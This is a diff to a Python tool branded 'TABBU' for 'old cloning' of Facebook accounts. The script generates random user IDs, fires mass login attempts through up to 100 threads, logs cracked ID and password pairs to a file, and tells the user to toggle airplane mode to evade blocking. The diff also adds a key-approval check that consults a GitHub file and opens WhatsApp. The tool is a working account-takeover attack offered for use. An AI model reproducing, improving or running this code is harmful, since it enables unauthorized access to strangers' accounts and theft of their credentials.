@@ -7,7 +7,7 @@ import uuid,base64,hashlib,zlib,subprocess,time,platform,_socket,ssl,certifi
 import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib
 from concurrent.futures import ThreadPoolExecutor as tred
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
-os.system('pkg install espeak')
+#os.system('pkg install espeak')
 
 loop,count,oks,cps,twf,usragent,ugen,okhbros,uas=0,0,[],[],[],[],[],[],[]
 
@@ -604,35 +604,17 @@ for xd in range(10000):
 def linex():print(f'\r\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 def line():print(f'\r\n\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
-os.system('clear')
-os.system('espeak -a 300 " Assalamu' 'alaikum"')
-os.system('espeak -a 300 " Your,   Real,  Name,"')
-NameX =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m:\33[1;32m')
-os.system('espeak -a 300 "well,come to,tabbu, tools"')
-os.system('xdg-open https://www.facebook.com/TabbuArain')
-logo = f"""
-\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-        
 
-████████╗ █████╗ ██████╗ ██████╗ ██╗   ██╗
-╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██║   ██║
-   ██║   ███████║██████╔╝██████╔╝██║   ██║
-   ██║   ██╔══██║██╔══██╗██╔══██╗██║   ██║
-   ██║   ██║  ██║██████╔╝██████╔╝╚██████╔╝
-   ╚═╝   ╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝ 
-                                    
-                                          
-\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
-╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-║\33[0;41m     [ WORKS BOTH ON WIFI AND MOBILE DATA ]    \033[0;92m║
-╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
+logo = f"""
+\033[1;97m888888   db     88""Yb  88""Yb  88   88  
+  \033[1;32m88    dPYb    88__dP  88__dP  88   88    
+  \033[1;97m88   dP__Yb   88""Yb  88""Yb  Y8   8P    
+  \033[1;32m88  dP""""Yb  88oodP  88oodP  `YbodP'
 \33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mDEVELOPER  \33[38;5;160m➨  \033[1;97mMUHAMMAD TABASSUM
-\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mFACEBOOK   \33[38;5;160m➨  \033[1;97mTABBU ARAIN
-\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mGITHUB     \33[38;5;160m➨  \033[1;97mTabbu-Arain
-\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mWHATSAPP   \33[38;5;160m➨  \033[1;97m+994402197773
-\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mFEATURES   \33[38;5;160m➨  \033[1;97mOLD CLONING 
-\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mVERSION    \33[38;5;160m➨  \033[1;97mUPDATED \33[38;5;37m≫ \033[1;97m2.0
+\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mDEVELOPER   \33[38;5;160m▶  \033[1;97mMUHAMMAD TABASSUM
+\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mGITHUB      \33[38;5;160m▶  \033[1;97mTabbu-Arain
+\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mFEATURES    \33[38;5;160m▶  \033[1;97mOLD CLONING 
+\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mVERSION    \33[38;5;160m▶  \033[1;97mFREE \33[38;5;37m≫ \033[1;97mUPDATED 2.0
 \33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
 
 def clear():
@@ -664,83 +646,83 @@ def main():
 def __Old1__():
     user=[]
     clear()
-    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
+    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m20000\33[38;5;37m|\033[1;97m40000\33[38;5;37m|\033[1;97m60000\33[38;5;37m|\033[1;97m80000')
     linex()
     limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
     linex()
     year_code = '100000'
     for i in range(int(limit)):
     	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
-    with tred(max_workers=30) as jihad:
+    with tred(max_workers=100) as jihad:
         clear()
-        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL IDS \33[38;5;160m▶ \033[1;97m{limit}')
+        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
         print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSE AIRPLANE MODE AFTER EVERY 5 MINUTES ')
         linex()
         for mal in user:
         	uid=year_code+mal
         	jihad.submit(login1,uid)
-    line();print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mYOUR CLONING HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mENTER TO BACK RUN AGAIN...\33[38;5;160m!\033[1;37m');main()
+    line();print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mCLONING HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mPRESS ENTER TO RUN AGAIN...\33[38;5;160m!\033[1;37m');main()
 
 
 def __Old2__():
     user=[]
     clear()
-    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
+    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m20000\33[38;5;37m|\033[1;97m40000\33[38;5;37m|\033[1;97m60000\33[38;5;37m|\033[1;97m80000')
     linex()
     limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
     linex()
     year_code = '10000'
     for i in range(int(limit)):
     	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
-    with tred(max_workers=30) as jihad:
+    with tred(max_workers=100) as jihad:
         clear()
-        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL IDS \33[38;5;160m▶ \033[1;97m{limit}')
+        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
         print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSE AIRPLANE MODE AFTER EVERY 5 MINUTES ')
         linex()
         for mal in user:
             uid=year_code+mal
             jihad.submit(login2,uid)
-    line();print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mYOUR CLONING HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mENTER TO BACK RUN AGAIN...\33[38;5;160m!\033[1;37m');main()
+    line();print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mCLONING HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mPRESS ENTER TO RUN AGAIN...\33[38;5;160m!\033[1;37m');main()
 
 def __Old3__():
     user=[]
     clear()
-    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
+    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m20000\33[38;5;37m|\033[1;97m40000\33[38;5;37m|\033[1;97m60000\33[38;5;37m|\033[1;97m80000')
     linex()
     limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
     linex()
     year_code = '10000'
     for i in range(int(limit)):
     	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
-    with tred(max_workers=30) as jihad:
+    with tred(max_workers=100) as jihad:
         clear()
-        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL IDS \33[38;5;160m▶ \033[1;97m{limit}')
+        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
         print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSE AIRPLANE MODE AFTER EVERY 5 MINUTES ')
         linex()
         for mal in user:
             uid=year_code+mal
             jihad.submit(login3,uid)
-    line();print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mYOUR CLONING HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mENTER TO BACK RUN AGAIN...\33[38;5;160m!\033[1;37m');main()
+    line();print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mCLONING HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mPRESS ENTER TO RUN AGAIN...\33[38;5;160m!\033[1;37m');main()
 
 def __Old4__():
     user=[]
     clear()
-    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶\033[1;97m 10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
+    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶\033[1;97m 20000\33[38;5;37m|\033[1;97m40000\33[38;5;37m|\033[1;97m60000\33[38;5;37m|\033[1;97m80000')
     linex()
     limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
     linex()
     year_code = '10000'
     for i in range(int(limit)):
     	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
-    with tred(max_workers=30) as jihad:
+    with tred(max_workers=100) as jihad:
         clear()
-        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL IDS \33[38;5;160m▶ \033[1;97m{limit}')
+        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
         print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSE AIRPLANE MODE AFTER EVERY 5 MINUTES ')
         linex()
         for mal in user:
             uid=year_code+mal
             jihad.submit(login4,uid)            
-    line();print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mYOUR CLONING HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mENTER TO BACK RUN AGAIN...\33[38;5;160m!\033[1;37m');main()
+    line();print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mCLONING HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mPRESS ENTER TO RUN AGAIN...\33[38;5;160m!\033[1;37m');main()
 
 def login1(uid):
     global oks,loop,cps
@@ -792,12 +774,12 @@ def login1(uid):
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
                 print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/TABBU-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
                 print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/TABBU-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
@@ -853,12 +835,12 @@ def login2(uid):
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
                 print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/TABBU-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
                 print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/TABBU-M2-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
@@ -914,12 +896,12 @@ def login3(uid):
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
                 print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/TABBU-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
                 print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/TABBU-M3-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
@@ -975,15 +957,41 @@ def login4(uid):
             rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "session_key" in rp:            	
                 print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/TABBU-M4-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
                 print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
-                open("/sdcard/TABBU-M4-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                open("/sdcard/TABBU-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
         loop+=1
     except Exception as e:time.sleep(30)
+def meyexudi():
+  os.system('clear')
+  print(logo)
+  
+  uuid = "md"+str(os.getuid())+"tabbu"+str(os.getuid())+"FREE.TOOL"
+  id = ''.join(uuid)
+  try:
+    httpCaht = requests.get(f"https://github.com/Tabbu-Arain/Tabbu-xd/blob/main/approval.txt").text
+    if id in httpCaht:
+      msg = str(os.geteuid())
+      print()
+      pass
+    else:
+      print(" \033[32;1m[+] Your Key : "+id)      
+      print(' \x1b[1;98m║══[•]💥  ONLY ACTIVE ID CLONE 100%')
+      print(' \x1b[1;93m║══[•]💥  CP ID WILL BE LOGIN 80%')
+      print(' \x1b[1;97m║══[•]💥  WI-FI  AND DATA BOTH WORKING 100%')
+      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   TABBU,   ARAIN ,    Please,   Send,   Your,   Key,"')
+      print(" \x1b[0m║══[KEY]  : "+id)
+      uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
+      input(' \033[1;30m╚══[•] IF U WANT APPROVAL FOR FREE THEN PRESS ENTER ')
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+994402197773?text='+tks),approval()       
+  except:
+    sys.exit()
+print(logo)
+meyexudi()
 main()
